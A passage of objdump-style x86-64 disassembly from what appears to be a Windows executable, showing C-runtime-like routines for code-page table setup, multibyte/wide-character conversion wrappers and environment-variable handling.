   140006cb4:	75 2e                	jne    0x140006ce4
   140006cb6:	48 89 46 04          	mov    %rax,0x4(%rsi)
   140006cba:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   140006cc1:	89 5e 18             	mov    %ebx,0x18(%rsi)
   140006cc4:	66 89 5e 1c          	mov    %bx,0x1c(%rsi)
   140006cc8:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   140006ccc:	0f b7 c3             	movzwl %bx,%eax
   140006ccf:	b9 06 00 00 00       	mov    $0x6,%ecx
   140006cd4:	66 f3 ab             	rep stos %ax,(%rdi)
   140006cd7:	48 8b ce             	mov    %rsi,%rcx
   140006cda:	e8 7d fa ff ff       	call   0x14000675c
   140006cdf:	e9 e2 01 00 00       	jmp    0x140006ec6
   140006ce4:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140006ce9:	8b cf                	mov    %edi,%ecx
   140006ceb:	ff 15 8f 74 00 00    	call   *0x748f(%rip)        # 0x14000e180
   140006cf1:	85 c0                	test   %eax,%eax
   140006cf3:	0f 84 c4 00 00 00    	je     0x140006dbd
   140006cf9:	33 d2                	xor    %edx,%edx
   140006cfb:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   140006cff:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140006d05:	e8 76 bc ff ff       	call   0x140002980
   140006d0a:	83 7c 24 20 02       	cmpl   $0x2,0x20(%rsp)
   140006d0f:	89 7e 04             	mov    %edi,0x4(%rsi)
   140006d12:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   140006d19:	0f 85 94 00 00 00    	jne    0x140006db3
   140006d1f:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   140006d24:	38 5c 24 26          	cmp    %bl,0x26(%rsp)
   140006d28:	74 2c                	je     0x140006d56
   140006d2a:	38 59 01             	cmp    %bl,0x1(%rcx)
   140006d2d:	74 27                	je     0x140006d56
   140006d2f:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   140006d33:	0f b6 11             	movzbl (%rcx),%edx
   140006d36:	3b d0                	cmp    %eax,%edx
   140006d38:	77 14                	ja     0x140006d4e
   140006d3a:	2b c2                	sub    %edx,%eax
   140006d3c:	8d 7a 01             	lea    0x1(%rdx),%edi
   140006d3f:	8d 14 28             	lea    (%rax,%rbp,1),%edx
   140006d42:	80 4c 37 18 04       	orb    $0x4,0x18(%rdi,%rsi,1)
   140006d47:	03 fd                	add    %ebp,%edi
   140006d49:	48 2b d5             	sub    %rbp,%rdx
   140006d4c:	75 f4                	jne    0x140006d42
   140006d4e:	48 83 c1 02          	add    $0x2,%rcx
   140006d52:	38 19                	cmp    %bl,(%rcx)
   140006d54:	75 d4                	jne    0x140006d2a
   140006d56:	48 8d 46 1a          	lea    0x1a(%rsi),%rax
   140006d5a:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   140006d5f:	80 08 08             	orb    $0x8,(%rax)
   140006d62:	48 03 c5             	add    %rbp,%rax
   140006d65:	48 2b cd             	sub    %rbp,%rcx
   140006d68:	75 f5                	jne    0x140006d5f
   140006d6a:	8b 4e 04             	mov    0x4(%rsi),%ecx
   140006d6d:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   140006d73:	74 2e                	je     0x140006da3
   140006d75:	83 e9 04             	sub    $0x4,%ecx
   140006d78:	74 20                	je     0x140006d9a
   140006d7a:	83 e9 0d             	sub    $0xd,%ecx
   140006d7d:	74 12                	je     0x140006d91
   140006d7f:	3b cd                	cmp    %ebp,%ecx
   140006d81:	74 05                	je     0x140006d88
   140006d83:	48 8b c3             	mov    %rbx,%rax
   140006d86:	eb 22                	jmp    0x140006daa
   140006d88:	48 8b 05 f1 87 00 00 	mov    0x87f1(%rip),%rax        # 0x14000f580
   140006d8f:	eb 19                	jmp    0x140006daa
   140006d91:	48 8b 05 e0 87 00 00 	mov    0x87e0(%rip),%rax        # 0x14000f578
   140006d98:	eb 10                	jmp    0x140006daa
   140006d9a:	48 8b 05 cf 87 00 00 	mov    0x87cf(%rip),%rax        # 0x14000f570
   140006da1:	eb 07                	jmp    0x140006daa
   140006da3:	48 8b 05 be 87 00 00 	mov    0x87be(%rip),%rax        # 0x14000f568
   140006daa:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   140006db1:	eb 02                	jmp    0x140006db5
   140006db3:	8b eb                	mov    %ebx,%ebp
   140006db5:	89 6e 08             	mov    %ebp,0x8(%rsi)
   140006db8:	e9 0b ff ff ff       	jmp    0x140006cc8
   140006dbd:	39 1d 3d 10 01 00    	cmp    %ebx,0x1103d(%rip)        # 0x140017e00
   140006dc3:	0f 85 f5 00 00 00    	jne    0x140006ebe
   140006dc9:	83 c8 ff             	or     $0xffffffff,%eax
   140006dcc:	e9 f7 00 00 00       	jmp    0x140006ec8
   140006dd1:	33 d2                	xor    %edx,%edx
   140006dd3:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   140006dd7:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140006ddd:	e8 9e bb ff ff       	call   0x140002980
   140006de2:	41 8b c6             	mov    %r14d,%eax
   140006de5:	4d 8d 4d 10          	lea    0x10(%r13),%r9
   140006de9:	4c 8d 3d b0 06 01 00 	lea    0x106b0(%rip),%r15        # 0x1400174a0
   140006df0:	41 be 04 00 00 00    	mov    $0x4,%r14d
   140006df6:	4c 8d 1c 40          	lea    (%rax,%rax,2),%r11
   140006dfa:	49 c1 e3 04          	shl    $0x4,%r11
   140006dfe:	4d 03 cb             	add    %r11,%r9
   140006e01:	49 8b d1             	mov    %r9,%rdx
   140006e04:	41 38 19             	cmp    %bl,(%r9)
   140006e07:	74 3e                	je     0x140006e47
   140006e09:	38 5a 01             	cmp    %bl,0x1(%rdx)
   140006e0c:	74 39                	je     0x140006e47
   140006e0e:	44 0f b6 02          	movzbl (%rdx),%r8d
   140006e12:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140006e16:	44 3b c0             	cmp    %eax,%r8d
   140006e19:	77 24                	ja     0x140006e3f
   140006e1b:	45 8d 50 01          	lea    0x1(%r8),%r10d
   140006e1f:	41 81 fa 01 01 00 00 	cmp    $0x101,%r10d
   140006e26:	73 17                	jae    0x140006e3f
   140006e28:	41 8a 07             	mov    (%r15),%al
   140006e2b:	44 03 c5             	add    %ebp,%r8d
   140006e2e:	41 08 44 32 18       	or     %al,0x18(%r10,%rsi,1)
   140006e33:	44 03 d5             	add    %ebp,%r10d
   140006e36:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140006e3a:	44 3b c0             	cmp    %eax,%r8d
   140006e3d:	76 e0                	jbe    0x140006e1f
   140006e3f:	48 83 c2 02          	add    $0x2,%rdx
   140006e43:	38 1a                	cmp    %bl,(%rdx)
   140006e45:	75 c2                	jne    0x140006e09
   140006e47:	49 83 c1 08          	add    $0x8,%r9
   140006e4b:	4c 03 fd             	add    %rbp,%r15
   140006e4e:	4c 2b f5             	sub    %rbp,%r14
   140006e51:	75 ae                	jne    0x140006e01
   140006e53:	89 7e 04             	mov    %edi,0x4(%rsi)
   140006e56:	89 6e 08             	mov    %ebp,0x8(%rsi)
   140006e59:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   140006e5f:	74 29                	je     0x140006e8a
   140006e61:	83 ef 04             	sub    $0x4,%edi
   140006e64:	74 1b                	je     0x140006e81
   140006e66:	83 ef 0d             	sub    $0xd,%edi
   140006e69:	74 0d                	je     0x140006e78
   140006e6b:	3b fd                	cmp    %ebp,%edi
   140006e6d:	75 22                	jne    0x140006e91
   140006e6f:	48 8b 1d 0a 87 00 00 	mov    0x870a(%rip),%rbx        # 0x14000f580
   140006e76:	eb 19                	jmp    0x140006e91
   140006e78:	48 8b 1d f9 86 00 00 	mov    0x86f9(%rip),%rbx        # 0x14000f578
   140006e7f:	eb 10                	jmp    0x140006e91
   140006e81:	48 8b 1d e8 86 00 00 	mov    0x86e8(%rip),%rbx        # 0x14000f570
   140006e88:	eb 07                	jmp    0x140006e91
   140006e8a:	48 8b 1d d7 86 00 00 	mov    0x86d7(%rip),%rbx        # 0x14000f568
   140006e91:	4c 2b de             	sub    %rsi,%r11
   140006e94:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   140006e9b:	48 8d 56 0c          	lea    0xc(%rsi),%rdx
   140006e9f:	b9 06 00 00 00       	mov    $0x6,%ecx
   140006ea4:	4b 8d 3c 2b          	lea    (%r11,%r13,1),%rdi
   140006ea8:	0f b7 44 17 f8       	movzwl -0x8(%rdi,%rdx,1),%eax
   140006ead:	66 89 02             	mov    %ax,(%rdx)
   140006eb0:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   140006eb4:	48 2b cd             	sub    %rbp,%rcx
   140006eb7:	75 ef                	jne    0x140006ea8
   140006eb9:	e9 19 fe ff ff       	jmp    0x140006cd7
   140006ebe:	48 8b ce             	mov    %rsi,%rcx
   140006ec1:	e8 06 f8 ff ff       	call   0x1400066cc
   140006ec6:	33 c0                	xor    %eax,%eax
   140006ec8:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140006ecd:	48 33 cc             	xor    %rsp,%rcx
   140006ed0:	e8 1b 65 00 00       	call   0x14000d3f0
   140006ed5:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140006edc:	00 
   140006edd:	48 83 c4 40          	add    $0x40,%rsp
   140006ee1:	41 5f                	pop    %r15
   140006ee3:	41 5e                	pop    %r14
   140006ee5:	41 5d                	pop    %r13
   140006ee7:	41 5c                	pop    %r12
   140006ee9:	5f                   	pop    %rdi
   140006eea:	5e                   	pop    %rsi
   140006eeb:	5d                   	pop    %rbp
   140006eec:	c3                   	ret
   140006eed:	cc                   	int3
   140006eee:	cc                   	int3
   140006eef:	cc                   	int3
   140006ef0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006ef5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006efa:	57                   	push   %rdi
   140006efb:	48 83 ec 40          	sub    $0x40,%rsp
   140006eff:	8b da                	mov    %edx,%ebx
   140006f01:	41 8b f9             	mov    %r9d,%edi
   140006f04:	48 8b d1             	mov    %rcx,%rdx
   140006f07:	41 8b f0             	mov    %r8d,%esi
   140006f0a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006f0f:	e8 00 de ff ff       	call   0x140004d14
   140006f14:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140006f19:	0f b6 d3             	movzbl %bl,%edx
   140006f1c:	40 84 7c 02 19       	test   %dil,0x19(%rdx,%rax,1)
   140006f21:	75 1a                	jne    0x140006f3d
   140006f23:	85 f6                	test   %esi,%esi
   140006f25:	74 10                	je     0x140006f37
   140006f27:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140006f2c:	48 8b 08             	mov    (%rax),%rcx
   140006f2f:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   140006f33:	23 c6                	and    %esi,%eax
   140006f35:	eb 02                	jmp    0x140006f39
   140006f37:	33 c0                	xor    %eax,%eax
   140006f39:	85 c0                	test   %eax,%eax
   140006f3b:	74 05                	je     0x140006f42
   140006f3d:	b8 01 00 00 00       	mov    $0x1,%eax
   140006f42:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140006f47:	74 0c                	je     0x140006f55
   140006f49:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140006f4e:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140006f55:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140006f5a:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140006f5f:	48 83 c4 40          	add    $0x40,%rsp
   140006f63:	5f                   	pop    %rdi
   140006f64:	c3                   	ret
   140006f65:	cc                   	int3
   140006f66:	cc                   	int3
   140006f67:	cc                   	int3
   140006f68:	8b d1                	mov    %ecx,%edx
   140006f6a:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140006f70:	33 c9                	xor    %ecx,%ecx
   140006f72:	45 33 c0             	xor    %r8d,%r8d
   140006f75:	e9 76 ff ff ff       	jmp    0x140006ef0
   140006f7a:	cc                   	int3
   140006f7b:	cc                   	int3
   140006f7c:	81 f9 35 c4 00 00    	cmp    $0xc435,%ecx
   140006f82:	77 20                	ja     0x140006fa4
   140006f84:	8d 81 d4 3b ff ff    	lea    -0xc42c(%rcx),%eax
   140006f8a:	83 f8 09             	cmp    $0x9,%eax
   140006f8d:	77 0c                	ja     0x140006f9b
   140006f8f:	41 ba a7 02 00 00    	mov    $0x2a7,%r10d
   140006f95:	41 0f a3 c2          	bt     %eax,%r10d
   140006f99:	72 05                	jb     0x140006fa0
   140006f9b:	83 f9 2a             	cmp    $0x2a,%ecx
   140006f9e:	75 2f                	jne    0x140006fcf
   140006fa0:	33 d2                	xor    %edx,%edx
   140006fa2:	eb 2b                	jmp    0x140006fcf
   140006fa4:	81 f9 98 d6 00 00    	cmp    $0xd698,%ecx
   140006faa:	74 20                	je     0x140006fcc
   140006fac:	81 f9 a9 de 00 00    	cmp    $0xdea9,%ecx
   140006fb2:	76 1b                	jbe    0x140006fcf
   140006fb4:	81 f9 b3 de 00 00    	cmp    $0xdeb3,%ecx
   140006fba:	76 e4                	jbe    0x140006fa0
   140006fbc:	81 f9 e8 fd 00 00    	cmp    $0xfde8,%ecx
   140006fc2:	74 dc                	je     0x140006fa0
   140006fc4:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   140006fca:	75 03                	jne    0x140006fcf
   140006fcc:	83 e2 08             	and    $0x8,%edx
   140006fcf:	48 ff 25 b2 71 00 00 	rex.W jmp *0x71b2(%rip)        # 0x14000e188
   140006fd6:	cc                   	int3
   140006fd7:	cc                   	int3
   140006fd8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006fdd:	57                   	push   %rdi
   140006fde:	8d 81 18 02 ff ff    	lea    -0xfde8(%rcx),%eax
   140006fe4:	45 8b d9             	mov    %r9d,%r11d
   140006fe7:	83 f8 01             	cmp    $0x1,%eax
   140006fea:	49 8b d8             	mov    %r8,%rbx
   140006fed:	41 0f 96 c2          	setbe  %r10b
   140006ff1:	33 ff                	xor    %edi,%edi
   140006ff3:	81 f9 35 c4 00 00    	cmp    $0xc435,%ecx
   140006ff9:	77 1c                	ja     0x140007017
   140006ffb:	8d 81 d4 3b ff ff    	lea    -0xc42c(%rcx),%eax
   140007001:	83 f8 09             	cmp    $0x9,%eax
   140007004:	77 0c                	ja     0x140007012
   140007006:	41 b8 a7 02 00 00    	mov    $0x2a7,%r8d
   14000700c:	41 0f a3 c0          	bt     %eax,%r8d
   140007010:	72 33                	jb     0x140007045
   140007012:	83 f9 2a             	cmp    $0x2a,%ecx
   140007015:	eb 26                	jmp    0x14000703d
   140007017:	81 f9 98 d6 00 00    	cmp    $0xd698,%ecx
   14000701d:	74 26                	je     0x140007045
   14000701f:	81 f9 a9 de 00 00    	cmp    $0xdea9,%ecx
   140007025:	76 18                	jbe    0x14000703f
   140007027:	81 f9 b3 de 00 00    	cmp    $0xdeb3,%ecx
   14000702d:	76 16                	jbe    0x140007045
   14000702f:	81 f9 e8 fd 00 00    	cmp    $0xfde8,%ecx
   140007035:	74 0e                	je     0x140007045
   140007037:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   14000703d:	74 06                	je     0x140007045
   14000703f:	0f ba f2 07          	btr    $0x7,%edx
   140007043:	eb 02                	jmp    0x140007047
   140007045:	8b d7                	mov    %edi,%edx
   140007047:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000704c:	45 84 d2             	test   %r10b,%r10b
   14000704f:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   140007054:	4c 8b c0             	mov    %rax,%r8
   140007057:	4c 0f 45 c7          	cmovne %rdi,%r8
   14000705b:	4c 0f 45 cf          	cmovne %rdi,%r9
   14000705f:	74 07                	je     0x140007068
   140007061:	48 85 c0             	test   %rax,%rax
   140007064:	74 02                	je     0x140007068
   140007066:	89 38                	mov    %edi,(%rax)
   140007068:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   14000706d:	4c 8b c3             	mov    %rbx,%r8
   140007070:	4c 89 4c 24 40       	mov    %r9,0x40(%rsp)
   140007075:	45 8b cb             	mov    %r11d,%r9d
   140007078:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   14000707d:	5f                   	pop    %rdi
   14000707e:	48 ff 25 0b 71 00 00 	rex.W jmp *0x710b(%rip)        # 0x14000e190
   140007085:	cc                   	int3
   140007086:	cc                   	int3
   140007087:	cc                   	int3
   140007088:	48 8b c4             	mov    %rsp,%rax
   14000708b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000708f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140007093:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140007097:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000709b:	41 56                	push   %r14
   14000709d:	48 83 ec 40          	sub    $0x40,%rsp
   1400070a1:	ff 15 f1 70 00 00    	call   *0x70f1(%rip)        # 0x14000e198
   1400070a7:	45 33 f6             	xor    %r14d,%r14d
   1400070aa:	48 8b d8             	mov    %rax,%rbx
   1400070ad:	48 85 c0             	test   %rax,%rax
   1400070b0:	0f 84 a4 00 00 00    	je     0x14000715a
   1400070b6:	48 8b f0             	mov    %rax,%rsi
   1400070b9:	66 44 39 30          	cmp    %r14w,(%rax)
   1400070bd:	74 1c                	je     0x1400070db
   1400070bf:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400070c3:	48 ff c0             	inc    %rax
   1400070c6:	66 44 39 34 46       	cmp    %r14w,(%rsi,%rax,2)
   1400070cb:	75 f6                	jne    0x1400070c3
   1400070cd:	48 8d 34 46          	lea    (%rsi,%rax,2),%rsi
   1400070d1:	48 83 c6 02          	add    $0x2,%rsi
   1400070d5:	66 44 39 36          	cmp    %r14w,(%rsi)
   1400070d9:	75 e4                	jne    0x1400070bf
   1400070db:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   1400070e0:	48 2b f3             	sub    %rbx,%rsi
   1400070e3:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   1400070e8:	48 83 c6 02          	add    $0x2,%rsi
   1400070ec:	48 d1 fe             	sar    $1,%rsi
   1400070ef:	4c 8b c3             	mov    %rbx,%r8
   1400070f2:	44 8b ce             	mov    %esi,%r9d
   1400070f5:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   1400070fa:	33 d2                	xor    %edx,%edx
   1400070fc:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140007101:	33 c9                	xor    %ecx,%ecx
   140007103:	e8 d0 fe ff ff       	call   0x140006fd8
   140007108:	48 63 e8             	movslq %eax,%rbp
   14000710b:	85 c0                	test   %eax,%eax
   14000710d:	74 4b                	je     0x14000715a
   14000710f:	48 8b cd             	mov    %rbp,%rcx
   140007112:	e8 39 0e 00 00       	call   0x140007f50
   140007117:	48 8b f8             	mov    %rax,%rdi
   14000711a:	48 85 c0             	test   %rax,%rax
   14000711d:	74 2e                	je     0x14000714d
   14000711f:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140007124:	44 8b ce             	mov    %esi,%r9d
   140007127:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   14000712c:	4c 8b c3             	mov    %rbx,%r8
   14000712f:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   140007133:	33 d2                	xor    %edx,%edx
   140007135:	33 c9                	xor    %ecx,%ecx
   140007137:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000713c:	e8 97 fe ff ff       	call   0x140006fd8
   140007141:	85 c0                	test   %eax,%eax
   140007143:	74 08                	je     0x14000714d
   140007145:	48 8b f7             	mov    %rdi,%rsi
   140007148:	49 8b fe             	mov    %r14,%rdi
   14000714b:	eb 03                	jmp    0x140007150
   14000714d:	49 8b f6             	mov    %r14,%rsi
   140007150:	48 8b cf             	mov    %rdi,%rcx
   140007153:	e8 00 e7 ff ff       	call   0x140005858
   140007158:	eb 03                	jmp    0x14000715d
   14000715a:	49 8b f6             	mov    %r14,%rsi
   14000715d:	48 85 db             	test   %rbx,%rbx
   140007160:	74 09                	je     0x14000716b
   140007162:	48 8b cb             	mov    %rbx,%rcx
   140007165:	ff 15 35 70 00 00    	call   *0x7035(%rip)        # 0x14000e1a0
   14000716b:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007170:	48 8b c6             	mov    %rsi,%rax
   140007173:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140007178:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000717d:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140007182:	48 83 c4 40          	add    $0x40,%rsp
   140007186:	41 5e                	pop    %r14
   140007188:	c3                   	ret
   140007189:	cc                   	int3
   14000718a:	cc                   	int3
   14000718b:	cc                   	int3
   14000718c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140007191:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140007195:	55                   	push   %rbp
   140007196:	56                   	push   %rsi
   140007197:	57                   	push   %rdi
   140007198:	41 54                	push   %r12
   14000719a:	41 55                	push   %r13
   14000719c:	41 56                	push   %r14
   14000719e:	41 57                	push   %r15
   1400071a0:	48 83 ec 30          	sub    $0x30,%rsp
   1400071a4:	33 f6                	xor    %esi,%esi
   1400071a6:	8b da                	mov    %edx,%ebx
   1400071a8:	4c 8b f9             	mov    %rcx,%r15
   1400071ab:	48 85 c9             	test   %rcx,%rcx
   1400071ae:	75 14                	jne    0x1400071c4
   1400071b0:	e8 0b e6 ff ff       	call   0x1400057c0
   1400071b5:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400071bb:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400071bf:	e9 bb 02 00 00       	jmp    0x14000747f
   1400071c4:	ba 3d 00 00 00       	mov    $0x3d,%edx
   1400071c9:	49 8b ff             	mov    %r15,%rdi
   1400071cc:	e8 e7 66 00 00       	call   0x14000d8b8
   1400071d1:	4c 8b e8             	mov    %rax,%r13
   1400071d4:	48 85 c0             	test   %rax,%rax
   1400071d7:	0f 84 81 02 00 00    	je     0x14000745e
   1400071dd:	49 3b c7             	cmp    %r15,%rax
   1400071e0:	0f 84 78 02 00 00    	je     0x14000745e
   1400071e6:	4c 8b 35 4b 0b 01 00 	mov    0x10b4b(%rip),%r14        # 0x140017d38
   1400071ed:	4c 3b 35 5c 0b 01 00 	cmp    0x10b5c(%rip),%r14        # 0x140017d50
   1400071f4:	40 8a 68 01          	mov    0x1(%rax),%bpl
   1400071f8:	40 88 6c 24 70       	mov    %bpl,0x70(%rsp)
   1400071fd:	75 12                	jne    0x140007211
   1400071ff:	49 8b ce             	mov    %r14,%rcx
   140007202:	e8 a5 02 00 00       	call   0x1400074ac
   140007207:	4c 8b f0             	mov    %rax,%r14
   14000720a:	48 89 05 27 0b 01 00 	mov    %rax,0x10b27(%rip)        # 0x140017d38
   140007211:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   140007217:	4d 85 f6             	test   %r14,%r14
   14000721a:	0f 85 b5 00 00 00    	jne    0x1400072d5
   140007220:	85 db                	test   %ebx,%ebx
   140007222:	74 3f                	je     0x140007263
   140007224:	48 39 35 15 0b 01 00 	cmp    %rsi,0x10b15(%rip)        # 0x140017d40
   14000722b:	74 36                	je     0x140007263
   14000722d:	e8 56 ce ff ff       	call   0x140004088
   140007232:	48 85 c0             	test   %rax,%rax
   140007235:	0f 84 23 02 00 00    	je     0x14000745e
   14000723b:	4c 8b 35 f6 0a 01 00 	mov    0x10af6(%rip),%r14        # 0x140017d38
   140007242:	4c 3b 35 07 0b 01 00 	cmp    0x10b07(%rip),%r14        # 0x140017d50
   140007249:	0f 85 81 00 00 00    	jne    0x1400072d0
   14000724f:	49 8b ce             	mov    %r14,%rcx
   140007252:	e8 55 02 00 00       	call   0x1400074ac
   140007257:	4c 8b f0             	mov    %rax,%r14
   14000725a:	48 89 05 d7 0a 01 00 	mov    %rax,0x10ad7(%rip)        # 0x140017d38
   140007261:	eb 6d                	jmp    0x1400072d0
   140007263:	40 84 ed             	test   %bpl,%bpl
   140007266:	0f 84 01 02 00 00    	je     0x14000746d
   14000726c:	ba 08 00 00 00       	mov    $0x8,%edx
   140007271:	49 8b cc             	mov    %r12,%rcx
   140007274:	e8 67 e5 ff ff       	call   0x1400057e0
   140007279:	33 c9                	xor    %ecx,%ecx
   14000727b:	48 89 05 b6 0a 01 00 	mov    %rax,0x10ab6(%rip)        # 0x140017d38
   140007282:	e8 d1 e5 ff ff       	call   0x140005858
   140007287:	4c 8b 35 aa 0a 01 00 	mov    0x10aaa(%rip),%r14        # 0x140017d38
   14000728e:	4d 85 f6             	test   %r14,%r14
   140007291:	75 09                	jne    0x14000729c
   140007293:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   140007297:	e9 d3 01 00 00       	jmp    0x14000746f
   14000729c:	48 39 35 9d 0a 01 00 	cmp    %rsi,0x10a9d(%rip)        # 0x140017d40
   1400072a3:	75 2b                	jne    0x1400072d0
   1400072a5:	ba 08 00 00 00       	mov    $0x8,%edx
   1400072aa:	49 8b cc             	mov    %r12,%rcx
   1400072ad:	e8 2e e5 ff ff       	call   0x1400057e0
   1400072b2:	33 c9                	xor    %ecx,%ecx
   1400072b4:	48 89 05 85 0a 01 00 	mov    %rax,0x10a85(%rip)        # 0x140017d40
   1400072bb:	e8 98 e5 ff ff       	call   0x140005858
   1400072c0:	48 39 35 79 0a 01 00 	cmp    %rsi,0x10a79(%rip)        # 0x140017d40
   1400072c7:	74 ca                	je     0x140007293
   1400072c9:	4c 8b 35 68 0a 01 00 	mov    0x10a68(%rip),%r14        # 0x140017d38
   1400072d0:	4d 85 f6             	test   %r14,%r14
   1400072d3:	74 be                	je     0x140007293
   1400072d5:	49 8b 06             	mov    (%r14),%rax
   1400072d8:	4d 8b e5             	mov    %r13,%r12
   1400072db:	4d 2b e7             	sub    %r15,%r12
   1400072de:	49 8b de             	mov    %r14,%rbx
   1400072e1:	48 85 c0             	test   %rax,%rax
   1400072e4:	74 34                	je     0x14000731a
   1400072e6:	4d 8b c4             	mov    %r12,%r8
   1400072e9:	48 8b d0             	mov    %rax,%rdx
   1400072ec:	49 8b cf             	mov    %r15,%rcx
   1400072ef:	e8 68 31 00 00       	call   0x14000a45c
   1400072f4:	85 c0                	test   %eax,%eax
   1400072f6:	75 10                	jne    0x140007308
   1400072f8:	48 8b 03             	mov    (%rbx),%rax
   1400072fb:	41 80 3c 04 3d       	cmpb   $0x3d,(%r12,%rax,1)
   140007300:	74 0f                	je     0x140007311
   140007302:	41 38 34 04          	cmp    %sil,(%r12,%rax,1)
   140007306:	74 09                	je     0x140007311
   140007308:	48 83 c3 08          	add    $0x8,%rbx
   14000730c:	48 8b 03             	mov    (%rbx),%rax
   14000730f:	eb d0                	jmp    0x1400072e1
   140007311:	49 2b de             	sub    %r14,%rbx
   140007314:	48 c1 fb 03          	sar    $0x3,%rbx
   140007318:	eb 0a                	jmp    0x140007324
   14000731a:	49 2b de             	sub    %r14,%rbx
   14000731d:	48 c1 fb 03          	sar    $0x3,%rbx
   140007321:	48 f7 db             	neg    %rbx
   140007324:	48 85 db             	test   %rbx,%rbx
   140007327:	78 57                	js     0x140007380
   140007329:	49 39 36             	cmp    %rsi,(%r14)
   14000732c:	74 52                	je     0x140007380
   14000732e:	49 8b 0c de          	mov    (%r14,%rbx,8),%rcx
   140007332:	e8 21 e5 ff ff       	call   0x140005858
   140007337:	40 84 ed             	test   %bpl,%bpl
   14000733a:	74 15                	je     0x140007351
   14000733c:	4d 89 3c de          	mov    %r15,(%r14,%rbx,8)
   140007340:	e9 95 00 00 00       	jmp    0x1400073da
   140007345:	49 8b 44 de 08       	mov    0x8(%r14,%rbx,8),%rax
   14000734a:	49 89 04 de          	mov    %rax,(%r14,%rbx,8)
   14000734e:	48 ff c3             	inc    %rbx
   140007351:	49 39 34 de          	cmp    %rsi,(%r14,%rbx,8)
   140007355:	75 ee                	jne    0x140007345
   140007357:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000735d:	48 8b d3             	mov    %rbx,%rdx
   140007360:	49 8b ce             	mov    %r14,%rcx
   140007363:	e8 58 18 00 00       	call   0x140008bc0
   140007368:	33 c9                	xor    %ecx,%ecx
   14000736a:	48 8b d8             	mov    %rax,%rbx
   14000736d:	e8 e6 e4 ff ff       	call   0x140005858
   140007372:	48 85 db             	test   %rbx,%rbx
   140007375:	74 66                	je     0x1400073dd
   140007377:	48 89 1d ba 09 01 00 	mov    %rbx,0x109ba(%rip)        # 0x140017d38
   14000737e:	eb 5d                	jmp    0x1400073dd
   140007380:	40 84 ed             	test   %bpl,%bpl
   140007383:	0f 84 e8 00 00 00    	je     0x140007471
   140007389:	48 f7 db             	neg    %rbx
   14000738c:	48 8d 53 02          	lea    0x2(%rbx),%rdx
   140007390:	48 3b d3             	cmp    %rbx,%rdx
   140007393:	73 09                	jae    0x14000739e
   140007395:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   140007399:	e9 d5 00 00 00       	jmp    0x140007473
   14000739e:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   1400073a5:	ff ff 1f 
   1400073a8:	48 3b d0             	cmp    %rax,%rdx
   1400073ab:	73 e8                	jae    0x140007395
   1400073ad:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400073b3:	49 8b ce             	mov    %r14,%rcx
   1400073b6:	e8 05 18 00 00       	call   0x140008bc0
   1400073bb:	33 c9                	xor    %ecx,%ecx
